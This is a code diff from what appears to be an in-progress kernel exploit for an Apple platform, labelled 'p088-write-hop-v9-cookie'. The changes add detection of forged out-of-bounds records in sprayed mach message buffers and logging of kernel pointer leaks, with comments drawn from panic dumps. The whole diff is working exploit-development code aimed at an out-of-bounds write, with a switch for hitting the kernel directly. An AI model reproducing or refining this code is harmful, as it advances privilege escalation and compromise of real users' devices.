@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v8"
+#define P088_BUILD @"p088-write-hop-v9-cookie"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -274,6 +274,14 @@ static uint32_t g_p088_minGateSid = 0;
 static uint32_t g_p088_maxGateSid = 0;
 static uint32_t g_p088_lastOurBand = 0;   /* census of the last harvested hit */
 static uint32_t g_p088_ourBandTotal = 0;  /* cumulative across the tap */
+/* v9 zone-cookie census: records whose symbolIndex byte sits in 0xC0..0xFF
+   = OOB indexes 192..255 (the spill band; in-bounds records are 0x00..0xBF).
+   Panic evidence (notes 113/114): dumped tables carry symbol=0xc0+i and the
+   09:24 pc faulted at x20=x26=0xc0. A record counts as OURS only on the
+   FULL triple {+0x00 sid == forgeSid/gate band, +0x04 symbol in cookie
+   band, +0x08 flags == 0x100000001} - err==0 is never part of the signal. */
+static uint32_t g_p088_lastCookie = 0;
+static uint32_t g_p088_cookieTotal = 0;
 
 static void p088_log(NSString *fmt, ...) {
     va_list ap;
@@ -456,7 +464,7 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
     BOOL markerOK = (memcmp(body, "P088", 4) == 0 && memcmp(body + 4, &expect, 4) == 0);
     uint64_t *q = (uint64_t *)body;
     uint32_t nq = (P088_MSG_SIZE - (uint32_t)sizeof(mach_msg_header_t)) / 8;
-    uint32_t fillHits = 0, kptrs = 0, ourBand = 0;
+    uint32_t fillHits = 0, kptrs = 0, ourBand = 0, cookieBand = 0;
     for (uint32_t w = 0; w < nq; w++) {
         if (q[w] == P088_FILL_FLAG) {
             fillHits++;
@@ -464,9 +472,12 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
                OURS iff sid is in our live gate-pool band or == forgeSid;
                foreign tables carry driver-bound sids (175-561 tonight). */
             uint32_t rsid = (uint32_t)q[w - 1];
+            uint32_t rsym = (uint32_t)(q[w - 1] >> 32);
             if ((g_p088_maxGateSid && rsid >= g_p088_minGateSid &&
                  rsid <= g_p088_maxGateSid) || rsid == g_p088_forgeSid)
                 ourBand++;
+            /* v9 zone-cookie: symbolIndex 0xC0..0xFF = OOB record band. */
+            if (rsym >= 0xC0u && rsym <= 0xFFu) cookieBand++;
         }
         if (q[w] >= P088_KVA_MIN && q[w] < P088_KVA_MAX) {
             kptrs++;
@@ -476,8 +487,8 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
         }
     }
     if (!markerOK || fillHits) {
-        p088_log(@"  [D2] FILL HIT %s[%u] fillFlags=%u kptrs=%u ourBand=%u",
-                 label, v->index, fillHits, kptrs, ourBand);
+        p088_log(@"  [D2] FILL HIT %s[%u] fillFlags=%u kptrs=%u ourBand=%u cookieBand=%u",
+                 label, v->index, fillHits, kptrs, ourBand, cookieBand);
         /* records are {u32 sid, u32 symbol, u64 flags} — dump the first 3 */
         uint32_t shown = 0;
         for (uint32_t w = 1; w < nq && shown < 3; w++) {
@@ -485,9 +496,11 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
                 uint32_t rsid = (uint32_t)q[w - 1];
                 BOOL ours = (g_p088_maxGateSid && rsid >= g_p088_minGateSid &&
                              rsid <= g_p088_maxGateSid) || rsid == g_p088_forgeSid;
-                p088_log(@"      rec sid=%u symbol=0x%08x %@",
+                p088_log(@"      rec sid=%u symbol=0x%08x %@%@",
                          rsid, (uint32_t)(q[w - 1] >> 32),
-                         ours ? @"OURS-BAND" : @"foreign-band");
+                         ours ? @"OURS-BAND" : @"foreign-band",
+                         ((q[w - 1] >> 32) >= 0xC0u && (q[w - 1] >> 32) <= 0xFFu)
+                             ? @" [cookie-band]" : @"");
                 shown++;
             }
         }
@@ -509,6 +522,24 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
             }
         }
         if (!g_p088_hitOurs) {
+            /* v9 hardened fallback: record 195 need not be in view - ANY
+               record on the full triple {sid == forgeSid, symbol in the
+               0xC0..0xFF cookie band, flags == FILL_FLAG} is our forge. */
+            for (uint32_t w = 1; w < nq; w++) {
+                if (q[w] == P088_FILL_FLAG) {
+                    uint32_t sym = (uint32_t)(q[w - 1] >> 32);
+                    if (sym >= 0xC0u && sym <= 0xFFu &&
+                        (uint32_t)q[w - 1] == g_p088_forgeSid) {
+                        g_p088_hitOurs = 1;
+                        p088_log(@"      cookie-band record sym=0x%02x sid=%u == "
+                                 @"forgeSid (record 195 out of view; forge present)",
+                                 sym, g_p088_forgeSid);
+                        break;
+                    }
+                }
+            }
+        }
+        if (!g_p088_hitOurs) {
             if (ourBand > 0)
                 p088_log(@"      (no 0xC3 record visible but ourBand=%u: OUR table, "
                          @"partially overwritten - forge slot out of view)", ourBand);
@@ -516,6 +547,7 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
                 p088_log(@"      (no 0xC3 record visible and ourBand=0: FOREIGN table)");
         }
         g_p088_lastOurBand = ourBand;
+        g_p088_lastCookie = cookieBand;
         return -1;
     }
     return 1;
@@ -1019,6 +1051,7 @@ static NSString *p088_yfmt(double y) {
             if (hres < 0) {
                 rHits++; fillHits++;
                 g_p088_ourBandTotal += g_p088_lastOurBand;
+                g_p088_cookieTotal += g_p088_lastCookie;
                 if (hitIdx < 0) hitIdx = (int)i;
                 if (g_p088_hitOurs) {
                     if (!conv) {
@@ -1091,6 +1124,9 @@ static NSString *p088_yfmt(double y) {
     p088_log(@"fired per predict regardless). aOK(ever completed)=%d.", aOK ? 1 : 0);
     p088_log(@"D2 ourBand entries across all hits: %u (0 = every observed fill was", g_p088_ourBandTotal);
     p088_log(@"foreign). OUR fill observed = ourBand>0 or record-195 sid==forgeSid.");
+    p088_log(@"v9 zone-cookie records (symbol 0xC0..0xFF = OOB band) across all hits: %u", g_p088_cookieTotal);
+    p088_log(@"(a hit counts as OURS only on the full triple: sid==forgeSid/gate band,");
+    p088_log(@"symbol in the cookie band, flags==0x100000001 - err==0 is never the signal).");
 #if P088_KERNEL_TARGET
     if (bFires > 0 && bAnom == 0) {
         p088_log(@"KERNEL-TARGET volley completed %u fires with no abort. Completion-",
